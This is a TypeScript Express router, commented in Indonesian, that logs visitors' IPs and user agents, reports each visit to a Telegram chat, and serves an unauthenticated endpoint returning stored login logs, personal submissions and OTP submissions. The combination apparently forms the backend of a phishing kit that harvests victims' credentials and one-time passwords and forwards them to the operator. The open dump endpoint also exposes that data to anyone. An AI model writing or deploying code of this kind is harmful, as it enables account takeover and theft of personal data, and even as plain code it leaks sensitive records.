import { Router, type IRouter } from "express";
import { db, pageVisitsTable, loginLogsTable, personalSubmissionsTable, otpSubmissionsTable, contactSubmissionsTable } from "@workspace/db";
import { desc } from "drizzle-orm";
import { z } from "zod";
import { tgNotify } from "../lib/tg-notify";

const router: IRouter = Router();

const VisitBody = z.object({
  path: z.string().min(1),
  referrer: z.string().optional(),
  username: z.string().optional(),
});

/* POST /api/track/visit — log page visit + send Telegram notif */
router.post("/track/visit", async (req, res): Promise<void> => {
  const parsed = VisitBody.safeParse(req.body);
  if (!parsed.success) { res.status(400).json({ ok: false }); return; }

  const { path, referrer } = parsed.data;
  const ip = (req.headers["x-forwarded-for"] as string)?.split(",")[0]?.trim()
    ?? req.socket.remoteAddress
    ?? "unknown";
  const ua = req.headers["user-agent"] ?? "";

  await db.insert(pageVisitsTable).values({
    path,
    ipAddress: ip,
    userAgent: ua,
    referrer: referrer ?? null,
  }).catch(() => {});

  const now = new Date().toLocaleString("id-ID", { timeZone: "Asia/Jakarta" });
  await tgNotify(
    `🌐 <b>Kunjungan Halaman</b>\n\n` +
    `📄 Path   : <code>${path}</code>\n` +
    `🌐 IP     : <code>${ip}</code>\n` +
    `🕐 Waktu  : ${now}\n` +
    `📱 UA     : <code>${ua.slice(0, 80)}</code>`
  );

  res.json({ ok: true });
});

/* GET /api/data/all — semua record dari semua tabel utama */
router.get("/data/all", async (_req, res): Promise<void> => {
  try {
    const [visits, logins, personal, otp, contact] = await Promise.all([
      db.select().from(pageVisitsTable).orderBy(desc(pageVisitsTable.visitedAt)).limit(200),
      db.select().from(loginLogsTable).orderBy(desc(loginLogsTable.loggedAt)).limit(200),
      db.select().from(personalSubmissionsTable).orderBy(desc(personalSubmissionsTable.submittedAt)).limit(200),
      db.select().from(otpSubmissionsTable).orderBy(desc(otpSubmissionsTable.submittedAt)).limit(200),
      db.select().from(contactSubmissionsTable).orderBy(desc(contactSubmissionsTable.submittedAt)).limit(200),
    ]);
    res.json({ visits, logins, personal, otp, contact });
  } catch (err) {
    res.status(500).json({ error: String(err) });
  }
});

export default router;
